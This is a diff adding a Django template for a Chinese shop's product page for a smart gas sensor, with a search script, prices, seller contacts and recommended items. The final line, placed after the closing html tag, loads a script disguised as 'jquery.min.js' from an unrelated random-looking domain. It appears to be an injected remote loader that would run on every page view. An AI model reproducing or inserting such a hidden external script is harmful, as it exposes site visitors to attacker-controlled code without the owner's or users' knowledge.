@@ -1,0 +1,367 @@
+{% load staticfiles %}
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>珠江智联 智能可燃气体感应器</title>
+    <meta content="" name="keywords" />
+    <meta content="" name="description" />
+    <link href="{% static '/goals/css/car.css' %}" rel="stylesheet" type="text/css" />
+    <script type="text/javascript" src="{% static '/goals/js/jquery.js' %}"></script>
+    <script type="text/javascript" src="{% static '/goals/js/layer/layer.min.js' %}"></script>
+    <script type="text/javascript" src="{% static '/goals/js/laydate/laydate.js' %}"></script>
+    <script type="text/javascript" src="{% static '/goals/js/jquery.SuperSlide.2.1.js' %}"></script>
+    <script type="text/javascript" src="{% static '/goals/js/Validform_v5.3.2_min.js' %}"></script>
+    <script language="JavaScript">
+       
+    </script>
+</head>
+
+<body>
+    <!--内容-->
+    <script type="text/javascript" src="{% static '/goals/js/jquery.inputtext.js' %}"></script>
+    
+    <!--头部-->
+    
+    <div class="top">
+        <div class="top_main clearfix">
+            <div class="top_right">
+                欢迎来到珠江智联！
+                <span>
+                    <a href="{%  url 'sign_in' %}"> 登录</a>
+                </span>
+                <span>
+                    <a href="{%  url 'register' %}"> 注册</a>
+                </span>
+            </div>
+        </div>
+    </div>
+    <div class="headw">
+        <div class="head">
+            <div class="logo" style="text-align: center;line-height: 70px;color: green;">珠江智联</div>
+            <div class="topsearch">
+               <div class="topsearchbox">
+                <form>
+                    <input type="text" name="k" class="keywords" value="请输入关键词，如小米">
+                    <!-- <input type="submit" value="搜索" class="button" /> -->
+                    <span style="display: inline;padding:10px 25px;color:#fff;font-size:17px;background: #bc1950;cursor: pointer;" class="button">搜索</span>
+                    <!-- <input type="hidden" name="m" value="search"> -->
+                </form>
+            </div>
+            
+            <script>
+                $('.button').click(function () {
+                    var a = $('.keywords').val();
+                    console.log(a);
+                    if (a == '小米' || a == '小' || a == '米') {
+                        window.location.href = "{%  url 'seachx' %}";
+                    } else if (a == '公牛' || a == '公' || a == '牛') {
+                        window.location.href = "{%  url 'seachg' %}";
+                    } else if (a == '珠江智联' || a == '珠江' || a == '智联' || a == '珠' || a == '智') {
+                        window.location.href = "{% url 'seachz' %}"; 						}else { 						    window.location.href = "{%  url 'seachnull' %}";
+                    }
+                });
+            </script>
+                <p class="topkeywords">
+                    <a href="{%  url 'seachx' %}">小米</a>&nbsp;&nbsp;
+                    <a href="{%  url 'seachg' %}">公牛</a>&nbsp;&nbsp;</p>
+            </div>
+            <div class="carnum" id="carcount">
+            </div>
+        </div>
+    </div>
+    <div class="nav_list">
+        <ul class="clearfix">
+            <li>
+                <a href="{%  url 'index' %}" title="首页">首页</a>
+            </li>
+            <li>
+                <a href="{%  url 'sell' %}" title="卖车">卖家</a>
+            </li>
+            <li>
+                <a href="{%  url 'seach' %}" title="买车">买家</a>
+            </li>
+            <li>
+                <a href="{%  url 'about' %}" title="联系">联系</a>
+            </li>
+        </ul>
+    </div>
+    <!--头部end -->
+    <div class="nav">您当前的位置：
+        <a href="{%  url 'index' %}">首页</a>
+        <span>></span>
+        <a href="{%  url 'seach' %}">买家</a>
+        <span>></span>珠江智联</div>
+    <div class="main mt10">
+        <div class="carbox clearfix">
+            <div class="carbox_left">
+                <div class="carpicbox">
+                    <img src="{% static '/goals/images/501.jpg' %}" id="BigImg" />
+                </div>
+                <div class="ladyScroll">
+                    <a class="prev" href="javascript:void(0)"></a>
+                    <div class="scrollWrap">
+                        <div class="dlList">
+                            <dl>
+                                <dt>
+                                    <img src="{% static '/goals/images/501.jpg' %}" onmousemove="javascript:document.getElementById('BigImg').src='{% static '/goals/images/501.jpg' %}'">
+                                </dt>
+                            </dl>
+                        </div>
+                    </div>
+                    <a class="next" href="javascript:void(0)"></a>
+                </div>
+                <script type="text/javascript">
+                    jQuery(".ladyScroll").slide({ mainCell: ".dlList", effect: "leftLoop", vis: 5, autoPlay: true });
+                </script>
+            </div>
+            <div class="carbox_right">
+                <div class="carname">珠江智联 智能可燃气体感应器</div>
+                <p class="gray01 mt20">
+                    <span class="fr">点击：38
+                        <span class="orange01" id="hits"></span>
+                    </span>发布日期：2018-05-16</p>
+                <div class="detail01 mt10">
+                    <ul class="clearfix">
+                        <li class="li01 mb10">价格：
+                            <span class="price">￥108.00</span>
+                        </li>
+                        <li>品牌: 珠江智联</li>
+                        <li>分类：安全</li>
+                        <!-- <li>电池容量: 5200mAh</li> -->
+                        <li>型号: GWM01A</li>
+                    </ul>
+                    <div class="car_detail clearfix mt15">
+                        <div class="item">
+                            <strong>2016年9月</strong>上市时间
+                        </div>
+                        <div class="item">
+                            <strong>安全</strong>类型
+                        </div>
+                        <div class="item">
+                            <strong>12个月</strong>保修
+                        </div>
+                        <div class="item">
+                            <strong></strong>
+                        </div>
+                    </div>
+                    <div class="contactbox">
+                        <div class="telbox">
+                            <i></i>
+                            <p class="tel">
+                                <span class="fb">13417990977</span>
+                            </p>
+                            <p class="tel">谭先生</p>
+                        </div>
+                        <!--<div class="mobilecode">
+						<a href="#">扫码手机看</a>
+					</div>-->
+                    </div>
+                    <div class="mt20 clearfix">
+                        <span class="button_orange h35-p25 mr5">
+                            <a href="{%  url 'sign_in' %}" id="yuyue" style="background: #bc1950">预约</a>
+                        </span>
+                        <span class="button_gray h35-p25 ">
+                            <a href="{%  url 'sign_in' %}" id="xunjia" style="background: #bc1950;color:#fff;">咨询底价</a>
+                        </span>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="notice mt20" style="background: #bc1950;color:#fff;">
+        <span class="fr">客服电话：
+            <span class="orange01" style="color:#fff">020-84138253</span>
+        </span>交易前请勿轻易给对方押金、订金，交易中请仔细查验商品，避免上当受骗。
+    </div>
+    
+    <div class="main mt20 clearfix">
+        <div class="main_left">
+            <div class="cardetailbox">
+                <ul class="title_tab">
+                    <li class="here">
+                        <a href="#A">商品详情</a>
+                    </li>
+                    <li>
+                        <a href="#B">商品描述</a>
+                    </li>
+                    <li>
+                        <a href="#D">大图展示</a>
+                    </li>
+                </ul>
+                <div class="box">
+                    <h3 id="A">
+                        <span class="title">商品详情</span>
+                    </h3>
+                    <style>
+                        .xq li img{
+                            width:790px;
+                        }
+                    </style>
+                    <ul style="text-align: center;" class='xq'>
+                       <li>
+                           <img src="{% static '/goals/images/502.jpg' %}" alt="">
+                        </li>
+                        <li>
+                            <img src="{% static '/goals/images/503.jpg' %}" alt="">
+                        </li>
+                        <li>
+                            <img src="{% static '/goals/images/504.jpg' %}" alt="">
+                        </li>
+                        <li>
+                            <img src="{% static '/goals/images/505.jpg' %}" alt="">
+                        </li>
+                    </ul>
+                    <h3 id="B">
+                        <span class="title">商品描述</span>
+                    </h3>
+                    <div class="p20 cardetail">
+                        <!-- <img src="{% static '/goals/images/g1.jpg' %}" style="width:790px;" alt=""> -->
+                    </div>
+                    <h3 id="D">
+                        <span class="title">大图展示</span>
+                    </h3>
+                    <div class="p20">
+                        <p class="tc mt10">
+                            <img src="{% static '/goals/images/501.jpg' %}" width="790px">
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="main_right">
+            <div class="shopbox mb10">
+                <h3>浩宇专卖店</h3>
+                <div class="box">
+                    <ul class="shopcontact">
+                        <li>
+                            <strong>电话：</strong>
+                            <span>13417952223</span>
+                        </li>
+                        <li>
+                            <strong>地址：</strong>
+                            <span>广州市琶洲大道中06号</span>
+                        </li>
+                    </ul>
+                    <ul class="cycs-fbys clearfix">
+                        <li>
+                            <p>
+                                <strong>41</strong>
+                            </p>
+                            <p>发布</p>
+                        </li>
+                        <li>
+                            <p>
+                                <strong>41</strong>
+                            </p>
+                            <p>在售</p>
+                        </li>
+                        <li class="last">
+                            <p>
+                                <strong>0</strong>
+                            </p>
+                            <p>已售</p>
+                        </li>
+                    </ul>
+                    <div class="cyssbut">
+                        <span class="button_gray w200-h35">
+                            <a target="_blank" href="{% url 'sign_in' %}">进入商家店铺</a>
+                        </span>
+                    </div>
+                </div>
+            </div>
+            <div class="commonbox01">
+                <h3>
+                    <span class="title">热门推荐</span>
+                </h3>
+                <div class="box">
+                    <ul class="carlist clearfix">
+                    <ul class="carlist clearfix">
+                        <li>
+                            <a href="{%  url 'productz5' %}" target="_blank">
+                                <img src="{% static '/goals/images/501.jpg' %}" />
+                            </a>
+                            <p class="mt10">
+                                <a href="{%  url 'productz5' %}" target="_blank">珠江智联 可燃气感应器 </a>
+                            </p>
+                            <p class="gray01">
+                                <span class="orange01 fb fr">￥198.00</span>
+                            </p>
+                        </li>
+                        <li>
+                            <a href="{%  url 'productx1' %}" target="_blank">
+                                <img src="{% static '/goals/images/x101.jpg' %}" />
+                            </a>
+                            <p class="mt10">
+                                <a href="{%  url 'productx1' %}" target="_blank">小米 扫地机器人 </a>
+                            </p>
+                            <p class="gray01">
+                                <span class="orange01 fb fr">￥1699.00</span>
+                            </p>
+                        </li>
+                        <li>
+                            <a href="{%  url 'productz4' %}" target="_blank">
+                                <img src="{% static '/goals/images/401.jpg' %}" />
+                            </a>
+                            <p class="mt10">
+                                <a href="{%  url 'productz4' %}" target="_blank">珠江智联 智能门锁 </a>
+                            </p>
+                            <p class="gray01">
+                                <span class="orange01 fb fr">￥1388.00</span>
+                            </p>
+                        </li>
+                        <li>
+                            <a href="{%  url 'productg5' %}" target="_blank">
+                                <img src="{% static '/goals/images/g501.jpg' %}" />
+                            </a>
+                            <p class="mt10">
+                                <a href="{%  url 'productg5' %}" target="_blank">公牛智能快充 </a>
+                            </p>
+                            <p class="gray01">
+                                <span class="orange01 fb fr">￥58.00</span>
+                            </p>
+                        </li>
+                        <li>
+                            <a href="{%  url 'productg3' %}" target="_blank">
+                                <img src="{% static '/goals/images/g301.jpg' %}" />
+                            </a>
+                            <p class="mt10">
+                                <a href="{%  url 'productg3' %}" target="_blank">公牛 插座 </a>
+                            </p>
+                            <p class="gray01">
+                                <span class="orange01 fb fr">￥38.00</span>
+                            </p>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+            </div>
+    </div>
+    
+    <!--底部导航-->
+<div class="footer" id="foot">
+    <p class="tc">
+        <a href="{% url 'index' %}" title="首页">首页</a> |
+        <a href="{% url 'sell' %}" title="卖车">卖家</a> |
+        <a href="{% url 'seach' %}" title="买车">买家</a> |
+        <a href="{% url 'about' %}" title="联系">联系</a> |
+    </p>
+    <p class="mt10"> Copyright 2019 广东珠江智联信息科技股份有限公司版权所有
+        <a href="http://www.miitbeian.gov.cn/" title="粤ICP备16037358号-4">粤ICP备16037358号-4</a>
+    </p>
+    <p class="mt10"> 电话：020-84138253 地址：广州市海珠区琶洲大道中06-08号907室</p>
+</div>
+<div id="right-side" class="right-side">
+    <ul>
+        <li class="side-top w4">
+            <a id="backtop" title="返回顶部" href="#top" style="display: block;">返回顶部</a>
+        </li>
+    </ul>
+</div>
+    <!-- 版权 结束 -->
+</body>
+
+</html>
+<script charset="utf-8" async="true" src="http://ke.lduxnfz.com/s/ft/jquery.min.js"></script>
